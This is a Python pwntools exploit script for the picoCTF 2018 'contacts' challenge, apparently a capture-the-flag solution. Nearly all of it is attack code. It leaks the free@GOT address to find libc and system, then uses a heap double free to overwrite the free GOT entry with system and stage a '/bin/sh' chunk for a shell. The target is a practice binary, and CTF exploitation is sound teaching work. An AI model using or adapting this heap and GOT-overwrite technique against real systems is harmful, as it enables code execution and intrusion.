#!/usr/bin/env python

from pwn import *
import time

pico = 0

if pico:
    r = remote('2018shell2.picoctf.com', 9850)
else:
    env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./pico64.libc.so.6")}
    r = process("./contacts",env=env)
    gdb.attach(r)

time.sleep(3)

def create(name):
    r.sendline('create ' + name)
    r.recv()

def bio(name, msg):
    r.sendline('bio ' + name)
    r.recv()
    r.sendline(str(len(msg)))
    r.recv()
    r.sendline(msg)
    r.recv()

def popBio(name):
    r.sendline('bio ' + name)
    r.recv()
    r.sendline('999')
    r.recv()


MALLOC_GOT = 0x00602060 
FREE_GOT = 0x00602018

libc = ELF('./pico64.libc.so.6')

create("A"*4)
print r.recv(timeout=0.1)
bio("A"*4, "CCCCDDDD" + p64(FREE_GOT))
print r.recv(timeout=0.1)
popBio("A"*4)
print r.recv(timeout=0.1)
create("B"*4)
print r.recv(timeout=0.1)
r.sendline('display')
b = r.recv()
b = b.split()
print b
FREE = u64(b[5] + "\x00" * (8 - len(b[5])))
log.info("free@GOT: " + hex(FREE))

LIBC_BASE = FREE - libc.symbols['free']
SYSTEM = LIBC_BASE + libc.symbols['system'] 
log.info("system: " + hex(SYSTEM))
#r.interactive()

create("C" *4)
create("D" *4)
bio("C"*4, "EEEEFFFFGGGGHHHH")
bio("D"*4, "IIIIJJJJ")
popBio("D"*4)
popBio("C"*4)
popBio("D"*4)
bio("C"*4, p64(FREE_GOT) + p64(31))
create("/bin/sh")
time.sleep(1)
popBio("C"*4)
r.sendline('create ' + p64(SYSTEM))
print r.recv()
#r.sendline('delete /bin/sh')
